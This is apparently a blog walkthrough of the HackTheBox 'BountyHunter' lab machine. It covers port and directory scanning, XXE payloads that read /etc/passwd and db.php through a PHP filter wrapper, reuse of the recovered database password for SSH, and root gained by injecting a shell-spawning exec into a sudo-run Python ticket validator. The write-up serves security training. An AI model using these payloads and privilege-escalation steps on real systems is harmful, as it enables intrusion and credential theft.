---
title: HackTheBox - BountyHunter | EN
author: batmanly
date: 2022-05-30 10:10:00 +3
categories: [Writeup, HackTheBox]
tags: [web, xxe, php_filter, hackthebox, writeup]
render_with_liquid: false
img_path: /assets/img/hackthebox/bountyhunter/
---

# Information
## Room
-   **Name:** BountyHunter
-   **Profile:** [BountyHunter]('https://app.hackthebox.com/machines/BountyHunter')
-   **Difficulty:** Easy
![[logo.png]]

## Overview
It's a nice room , you can exploit xxe injection , php wrapper to read data, and get root access with exploiting python code and understand it's algorithm.

# Write-up
Let's start enumeration and see what we can gather.

## Network enumeration
Port and service scan with nmap:
```
nmap -sV -T4 -sS -v -Pn -p- 10.129.98.250 -sC -oN htb/BountyHunter/nmap
```

Output:
```
# Nmap 7.92 scan initiated Tue May 31 08:27:47 2022 as: nmap -sV -T4 -sS -v -Pn -p- -sC -oN htb/BountyHunter/nmap 10.129.98.250
Nmap scan report for 10.129.98.250 (10.129.98.250)
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 31 08:28:53 2022 -- 1 IP address (1 host up) scanned in 66.19 seconds


```

it's look we just have ssh and HTTP open with different port , let's go and enumerate HTTP port.
## Web enumeration
Discovering directories and files with go buster.
```
gobuster dir -u http://10.129.98.250:80/ -w $BIG -t 50

```

Let's enumerate files and folders then:
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.98.250:80/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /home/batmanly/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/31 08:30:34 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.129.98.250/assets/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.98.250/css/]   
/js                   (Status: 301) [Size: 311] [--> http://10.129.98.250/js/]    
/resources            (Status: 301) [Size: 318] [--> http://10.129.98.250/resources/]

```

after investigation webpage we found web portal , that's still in the development let's go to there and look what we can find.

```
# portal 

http://10.129.98.250/portal.php
```

we found there is a log submit system , let's try to inject some data and see what we will get as a response.
![[track_system.png]]
we found there is a data in the post request , after look the with decoder it's look xml to base64 data let's try to xxe payload if it's work . 
![[decoder.png]]

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>asfsdaf</cwe>
		<cvss>sdafdsa</cvss>
		<reward>222</reward>
		</bugreport>
```
let's use this xxe payload and send it to server , see the response.
![[xxe_payload.png]]
after sending xxe payload to server we can read data from server , so let's move on and read more files.

after some try i tried again content discovery with gobuster .

```
gobuster dir -u http://10.129.98.250:80/ -w $BIG -t 50 -x php
```

`Output:`
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.98.250:80/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /home/batmanly/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/05/31 08:48:25 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.129.98.250/assets/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.98.250/css/]   
/db.php               (Status: 200) [Size: 0]                                     
/index.php            (Status: 200) [Size: 25169]                                 
/js                   (Status: 301) [Size: 311] [--> http://10.129.98.250/js/]    
/portal.php           (Status: 200) [Size: 125]                                   
/resources            (Status: 301) [Size: 318] [--> http://10.129.98.250/resources/]
/server-status        (Status: 403) [Size: 278]                                      

```
let's read db.php with xxe vulnerability.
## Web exploitation
we will use this xxe payload to read db.php with PHP filter wrapper. than we will decode it.
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>asfsdaf</cwe>
		<cvss>sdafdsa</cvss>
		<reward>222</reward>
		</bugreport>
```

```
└─▪echo 'PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=' | base64 -d                                                                                                        
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>

```


![[db_php.png]]

now we have credentials let's try to access server with use we find /etc/passwd file and password we found 
from db.php file.

```
ssh development@10.129.98.250 

pass :m19RoAU0hP41A1sTsq6K
```

## Privilege Escalation
let's upload [linpeas]('https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS') and look if we can get any privilege escalation point to root or other user.

```
# Run Python Server
python3 -m http.server 80

# Get Linpeas 
wget http://10.8.199.191/linpeas.sh

# Run Linpeas
chmod +x linpeas.sh
./linpeas.sh

```

![[linpeas.png]]

we found that we can run this file without root password. so let's go and exploit this vulnerability.
![[previlege.png]]

after read algorithm of the file i create this payload to get root shell.

exploit.md
```python
# Skytrain Inc   
## Ticket to root  
__Ticket Code:__  
**11+100==111 and exec("import pty; pty.spawn(\"/bin/sh\")")

```

let's run this file and get root shell.

```
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/home/development/exploit.md
Destination: root
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
c4920fb496c6b325d2ff3c5a692f568b

```

![[done.png]]

![[]](/assets/img/tryhackme/haskhell/root.gif)

Yep. Now we Got root.
Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me.